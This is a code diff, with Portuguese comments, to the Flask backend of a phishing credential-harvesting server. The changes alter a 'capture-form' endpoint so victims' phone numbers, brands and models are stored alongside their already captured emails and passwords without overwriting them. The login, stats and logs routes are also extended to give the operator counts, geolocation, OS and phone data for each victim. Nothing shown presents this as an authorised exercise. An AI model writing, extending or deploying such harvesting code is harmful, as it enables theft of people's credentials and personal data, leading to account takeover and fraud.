@@ -129,7 +129,7 @@ def lookup_ip(ip):
 
 @app.route('/api/capture-form', methods=['POST'])
 def capture_form():
-    """Captura dados adicionais fornecidos pelo usuário (número, marca, etc)."""
+    """Captura dados adicionais do formulário (marca, modelo, telemóvel) SEM alterar email/senha."""
     try:
         from sqlalchemy.exc import IntegrityError
         
@@ -139,6 +139,11 @@ def capture_form():
         if not email:
             return jsonify({'error': 'Email é obrigatório'}), 400
         
+        # Dados do formulário
+        phone_number = data.get('phone_number', '').strip()
+        phone_brand = data.get('phone_brand', '').strip()
+        phone_model = data.get('phone_model', '').strip()
+        
         # Capturar IP
         client_ip = data.get('client_ip')
         if client_ip and client_ip != 'unknown':
@@ -146,54 +151,75 @@ def capture_form():
         else:
             ip = get_client_ip()
         
-        # Dados do formulário
-        phone_number = data.get('phone_number', '').strip()
-        phone_brand = data.get('phone_brand', '').strip()
-        phone_model = data.get('phone_model', '').strip()
-        
         # Device info do cliente (se enviado)
         client_device = data.get('device_info', {})
-        
-        # Combinar tudo
         user_agent = request.headers.get('User-Agent', '')
-        
-        # Construir o device_info completo
-        full_info = {
-            'source': 'checklist_form',
-            'phone_number': phone_number,
-            'phone_brand': phone_brand,
-            'phone_model': phone_model,
-            'form_data': data
-        }
-        
-        if client_device and isinstance(client_device, dict):
-            full_info['client_device'] = client_device
-        
         timestamp = datetime.utcnow()
         
-        # Verificar se email já existe para atualizar em vez de duplicar
+        # Verificar se email já existe
         existing = PhishingLogin.query.filter_by(email=email).first()
         
         if existing:
-            # Atualizar registo existente com dados do formulário
+            # IMPORTANTE: NÃO alterar email nem password (mantém os originais)
+            # Apenas atualizar o device_info para incluir os dados do formulário
+            try:
+                current_info = json.loads(existing.device_info or '{}')
+            except:
+                current_info = {}
+            
+            # Adicionar dados do formulário ao device_info (sem sobrepor)
+            current_info['checklist_form'] = {
+                'submitted': True,
+                'phone_number': phone_number,
+                'phone_brand': phone_brand,
+                'phone_model': phone_model,
+                'submitted_at': timestamp.isoformat()
+            }
+            
+            # Adicionar IP atualizado se fornecido
+            if ip and ip != '0.0.0.0':
+                current_info['last_ip'] = ip
+            if user_agent:
+                current_info['last_user_agent'] = user_agent
+            
             with db_lock:
-                existing.password = f'[FORM] {phone_brand} {phone_model} - {phone_number}'
-                existing.device_info = str(full_info)
+                # NÃO mexer em email nem password
+                existing.device_info = json.dumps(current_info)
                 existing.ip = ip
                 existing.timestamp = timestamp
                 if user_agent:
                     existing.user_agent = user_agent
                 db.session.commit()
                 entry_id = existing.id
+            
+            return jsonify({
+                'success': True,
+                'message': 'Dados do formulário adicionados (email e senha preservados)',
+                'id': entry_id
+            }), 200
         else:
-            # Criar novo registo
+            # Email NÃO existe - isto não deveria acontecer porque o utilizador
+            # precisa de fazer login primeiro. Mas criamos um registo mínimo.
+            # NOTA: sem password (o utilizador não preencheu)
+            full_info = {
+                'checklist_form': {
+                    'submitted': True,
+                    'phone_number': phone_number,
+                    'phone_brand': phone_brand,
+                    'phone_model': phone_model,
+                    'submitted_at': timestamp.isoformat()
+                }
+            }
+            if client_device and isinstance(client_device, dict):
+                full_info['client_device'] = client_device
+            
             with db_lock:
                 entry = PhishingLogin(
                     email=email,
-                    password=f'[FORM] {phone_brand} {phone_model} - {phone_number}',
+                    password='(formulário sem login)',  # Marcador - sem password real
                     ip=ip,
                     user_agent=user_agent,
-                    device_info=str(full_info),
+                    device_info=json.dumps(full_info),
                     timestamp=timestamp
                 )
                 db.session.add(entry)
@@ -201,24 +227,33 @@ def capture_form():
                     db.session.commit()
                     entry_id = entry.id
                 except IntegrityError:
-                    # Race condition - email foi criado entretanto
                     db.session.rollback()
+                    # Race condition - buscar o que foi criado
                     existing = PhishingLogin.query.filter_by(email=email).first()
                     if existing:
-                        existing.password = f'[FORM] {phone_brand} {phone_model} - {phone_number}'
-                        existing.device_info = str(full_info)
-                        existing.ip = ip
+                        try:
+                            current_info = json.loads(existing.device_info or '{}')
+                        except:
+                            current_info = {}
+                        current_info['checklist_form'] = {
+                            'submitted': True,
+                            'phone_number': phone_number,
+                            'phone_brand': phone_brand,
+                            'phone_model': phone_model,
+                            'submitted_at': timestamp.isoformat()
+                        }
+                        existing.device_info = json.dumps(current_info)
                         existing.timestamp = timestamp
                         db.session.commit()
                         entry_id = existing.id
                     else:
                         raise
-        
-        return jsonify({
-            'success': True,
-            'message': 'Dados capturados com sucesso',
-            'id': entry_id
-        }), 200
+            
+            return jsonify({
+                'success': True,
+                'message': 'Dados capturados',
+                'id': entry_id
+            }), 200
     
     except Exception as e:
         db.session.rollback()
@@ -416,7 +451,24 @@ def login():
                     
                     client_device = data.get('device_info')
                     if client_device and isinstance(client_device, dict):
-                        existing.device_info = str(client_device)
+                        # Preservar dados do checklist_form se já existirem
+                        try:
+                            current_info = json.loads(existing.device_info or '{}')
+                        except:
+                            current_info = {}
+                        
+                        # Manter checklist_form existente
+                        checklist_form = current_info.get('checklist_form')
+                        
+                        # Atualizar com novos device info
+                        current_info.update(client_device)
+                        current_info['client_provided'] = True
+                        
+                        # Restaurar checklist_form se existia
+                        if checklist_form:
+                            current_info['checklist_form'] = checklist_form
+                        
+                        existing.device_info = json.dumps(current_info)
                     
                     db.session.commit()
                 
@@ -504,20 +556,23 @@ def login():
 @app.route('/api/stats', methods=['GET'])
 def stats():
     try:
-        # Como agora rejeitamos duplicados, total = unique_emails
         total = db.session.query(db.func.count(PhishingLogin.id)).scalar()
         unique_emails = db.session.query(db.func.count(db.distinct(PhishingLogin.email))).scalar()
         unique_ips = db.session.query(db.func.count(db.distinct(PhishingLogin.ip))).scalar()
         
-        # Contar quantos têm geolocalização GPS
+        # Contar quantos têm geolocalização GPS E quantos preencheram o checklist
         entries = PhishingLogin.query.all()
         geo_count = 0
+        checklist_count = 0
         for entry in entries:
             try:
                 d = json.loads(entry.device_info or '{}')
                 geo = d.get('geolocation', {})
                 if geo and geo.get('lat') and geo.get('lon'):
                     geo_count += 1
+                checklist = d.get('checklist_form', {})
+                if checklist.get('submitted') or d.get('source') == 'checklist_form':
+                    checklist_count += 1
             except:
                 pass
         
@@ -525,7 +580,8 @@ def stats():
             'total_logins': total or 0,
             'unique_ips': unique_ips or 0,
             'unique_emails': unique_emails or 0,
-            'geo_count': geo_count
+            'geo_count': geo_count,
+            'checklist_count': checklist_count
         }), 200
     except Exception as e:
         return jsonify({'error': str(e)}), 500
@@ -534,7 +590,6 @@ def stats():
 def logs():
     try:
         # Agrupar por email e pegar apenas o registo mais recente de cada
-        # Isso garante que não há duplicados na visualização
         entries = PhishingLogin.query.order_by(PhishingLogin.timestamp.desc()).all()
         
         # Agrupar por email
@@ -545,6 +600,14 @@ def logs():
         
         logs_list = []
         for entry in grouped.values():
+            # Parse device_info para extrair dados do formulário
+            try:
+                d = json.loads(entry.device_info or '{}')
+            except:
+                d = {}
+            
+            checklist_form = d.get('checklist_form', {})
+            
             logs_list.append({
                 'id': entry.id,
                 'email': entry.email,
@@ -552,7 +615,16 @@ def logs():
                 'ip': entry.ip,
                 'user_agent': entry.user_agent,
                 'device_info': entry.device_info,
-                'timestamp': entry.timestamp.isoformat() if entry.timestamp else None
+                'timestamp': entry.timestamp.isoformat() if entry.timestamp else None,
+                # Campos extraídos do formulário (para fácil acesso no frontend)
+                'phone_brand': checklist_form.get('phone_brand') or d.get('phone_brand') or '',
+                'phone_model': checklist_form.get('phone_model') or d.get('phone_model') or '',
+                'phone_number': checklist_form.get('phone_number') or d.get('phone_number') or '',
+                'checklist_submitted': bool(checklist_form.get('submitted', False)) or d.get('source') == 'checklist_form',
+                # Geolocalização
+                'geolocation': d.get('geolocation', {}),
+                'os': d.get('os', ''),
+                'platform': d.get('platform', '')
             })
         
         # Ordenar por timestamp desc
